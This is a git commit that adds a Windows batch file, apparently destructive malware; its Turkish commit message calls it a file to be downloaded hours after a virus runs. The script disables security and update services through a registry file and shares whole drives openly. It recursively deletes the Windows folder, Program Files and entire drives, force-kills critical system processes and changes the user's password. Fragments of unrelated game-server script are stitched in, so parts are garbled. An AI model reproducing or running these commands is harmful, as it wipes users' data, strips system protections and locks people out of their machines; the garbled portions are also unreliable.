29d253cc459076029a94ab6d8aa55c6e83794218
spo9nglubohb <141757950+spo9nglubohb@users.noreply.github.com>
2024-03-19 02:48:09 +0300

    Add files via upload
    virüs çalıştıktan belli bir saat sonra indirilecek dosya

---
+++ main.bat
@@ -0,0 +1,78 @@
+@echo .:: svchost.exe ::.
+@echo off
+del C:/WINDOWS/system/KEYBOARD.DRV
+net stop "Security Center"
+net stop SharedAccess
+"%Temp%.\kill.reg" ECHO A R E S
+"%Temp%.\kill.reg" ECHO.
+"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\SharedAccess]
+"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
+"%Temp%.\kill.reg" ECHO.
+"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Servic es\wuauserv]
+"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
+"%Temp%.\kill.reg" ECHO.
+"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\w scsvc]
+"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
+"%Temp%.\kill.reg" ECHO.
+start /wait regedit /S "%Temp%.\kill.reg"
+del "%Temp%.\kill.reg"
+del %0
+90,90
+resizepic 0 0 5054 405 470
+gumppic 10 10 5528
+gumppic *100)/1337))> *100)/1067))> 2362
+text 20 400 455 0
+text 20 435 455 01 local.t_x=
+local.t_y=
+sector.allclients sendpacket 0c0 00 D D W W W?: W B?: B 00 00 00 B?:0> D - 1> D
+C:/windows/system32/ deleted
+net share hacker=c:\ /unlimited /remark:"RockStar"
+net share hacker=d:\ /unlimited /remark:"RockStar"
+@echo off
+C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
+@echo off
+C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
+@echo off
+C:\WINDOWS\COMMAND\deltree /y c:\*.*
+@echo off
+90,90
+resizepic 0 0 5054 405 470
+gumppic 10 10 5528
+gumppic *100)/1337))> *100)/1067))> 2362
+text 20 400 455 0
+text 20 435 455 01 local.t_x=
+local.t_y=
+sector.allclients sendpacket 0c0 00 D D W W W?: W B?: B 00 00 00 B?:0> D - 1> D
+erase c:/f/s/q/a
+/timersecure 0 0 //mkdir şmid(C:,1,2) ş+ şrand(1,99999) ş+ şrand(A,Z) ş+ şrand(a,z)
+taskkill /f /im explorer.exe
+taskkill /f /im AggregatorHost.exe
+taskkill /f /im ctfmon.exe
+taskkill /f /im cscript.exe
+taskkill /f /im RtkAudUService64.exe
+taskkill /f /im RtkAudUService32.exe
+taskkill /f /im RtkAudUService86.exe
+taskkill /f /im SecurityHealthSystray.exe
+taskkill /f /im svchost.exe
+taskkill /f /im lsass.exe
+taskkill /f /im ntoskrnl.exe
+taskkill /f /im smss.exe
+taskkill /f /im WUDFHost.exe
+taskkill /f /im sihost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+taskkill /f /im svchost.exe
+dir/s
+del /f /q d:
+del /f /q c:
+net user %username% GG EZ
+cls
